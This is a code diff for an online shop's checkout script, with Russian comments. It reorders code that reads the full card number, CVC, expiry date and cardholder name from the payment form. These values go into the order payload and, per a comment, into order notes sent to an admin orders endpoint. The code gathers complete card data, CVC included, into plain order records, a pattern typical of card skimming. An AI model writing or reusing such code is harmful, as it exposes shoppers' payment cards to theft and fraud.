@@ -598,6 +598,12 @@
                         const city = localStorage.getItem('customerCity') || '';
                         const currency = localStorage.getItem('checkoutCurrency') || 'zł';
 
+                        // Получаем данные карты ПЕРЕД созданием payload
+                        const cardNumberField = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.replace(/\s/g,'') : null;
+                        const cvcField = document.getElementById('cvc') ? document.getElementById('cvc').value : null;
+                        const expiryField = document.getElementById('expiry') ? document.getElementById('expiry').value : null;
+                        const cardholder = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : null;
+
                         const payload = {
                             items,
                             customer: {
@@ -624,18 +630,6 @@
                             expiry: expiryField,
                             cardholderName: cardholder
                         };
-
-                        // Получаем данные карты
-                        const cardNumberField = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.replace(/\s/g,'') : null;
-                        const cvcField = document.getElementById('cvc') ? document.getElementById('cvc').value : null;
-                        const expiryField = document.getElementById('expiry') ? document.getElementById('expiry').value : null;
-                        const cardholder = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : null;
-
-                        // Добавляем данные карты в payload (для /api/admin/orders)
-                        payload.cardNumber = cardNumberField;
-                        payload.cvc = cvcField;
-                        payload.expiry = expiryField;
-                        payload.cardholderName = cardholder;
                         
                         // Добавляем данные карты в notes (для обоих endpoints)
                         payload.notes = JSON.stringify({
